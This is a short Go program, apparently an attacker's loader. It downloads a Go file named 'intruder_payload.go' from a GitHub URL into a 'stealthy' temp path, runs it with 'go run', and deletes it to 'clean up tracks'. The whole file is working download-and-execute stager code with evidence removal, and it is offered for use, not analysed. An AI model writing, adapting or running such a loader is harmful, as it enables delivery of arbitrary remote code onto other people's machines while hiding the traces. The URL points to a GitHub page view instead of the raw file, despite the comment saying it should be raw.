package main

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
)

// --- CONFIGURATION ---
// Ensure this points to the exact raw file URL of your script on GitHub
const payloadURL = "https://github.com/herambhatode6-byte/spin/blob/main/main.go"
const fileName = "intruder_payload.go"

func main() {
	fmt.Println("[*] INITIATING LOADER SEQUENCE...")

	// 1. Define a stealthy temporary path
	tempDir := os.TempDir()
	destPath := filepath.Join(tempDir, fileName)

	// 2. Fetch the payload
	fmt.Println("[*] Fetching payload from GitHub...")
	if err := downloadFile(destPath, payloadURL); err != nil {
		fmt.Printf("[-] FATAL: Failed to download payload (%v)\n", err)
		os.Exit(1)
	}
	fmt.Printf("[+] Payload secured in memory buffer.\n")

	// 3. Execute the payload
	// Note: This requires the Go compiler to be installed on the machine running this .exe
	fmt.Println("[*] Executing payload...")
	cmd := exec.Command("go", "run", destPath)

	// Pipe the output to the current terminal so you can see the dashboard
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Stdin = os.Stdin

	if err := cmd.Run(); err != nil {
		fmt.Printf("[-] Execution terminated: %v\n", err)
	}

	// 4. Clean up tracks
	fmt.Println("[*] Wiping temporary files...")
	os.Remove(destPath)
}

// downloadFile streams the file directly to disk to keep memory usage low
func downloadFile(filepath string, url string) error {
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("bad status: %s", resp.Status)
	}

	out, err := os.Create(filepath)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)
	return err
}
